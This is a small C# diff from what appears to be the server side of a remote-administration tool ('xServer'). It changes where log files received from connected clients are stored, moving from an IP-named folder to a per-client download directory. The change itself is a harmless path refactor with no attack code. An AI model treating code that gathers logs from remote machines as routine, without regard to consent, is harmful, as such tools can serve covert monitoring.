@@ -124,7 +124,7 @@ namespace xServer.Core.Commands
                 return;
             }
 
-            string downloadPath = Path.Combine(Application.StartupPath, "Clients\\" + client.EndPoint.Address.ToString() + "\\Logs\\");
+            string downloadPath = Path.Combine(client.Value.DownloadDirectory, "Logs\\");
 
             if (!Directory.Exists(downloadPath))
                 Directory.CreateDirectory(downloadPath);
@@ -137,7 +137,7 @@ namespace xServer.Core.Commands
 
             if (packet.Index == packet.FileCount && (packet.CurrentBlock + 1) == packet.MaxBlocks)
             {
-                FileInfo[] iFiles = new DirectoryInfo(Path.Combine(Application.StartupPath, "Clients\\" + client.EndPoint.Address.ToString() + "\\Logs\\")).GetFiles();
+                FileInfo[] iFiles = new DirectoryInfo(Path.Combine(client.Value.DownloadDirectory, "Logs\\")).GetFiles();
 
                 if (iFiles.Length == 0)
                     return;
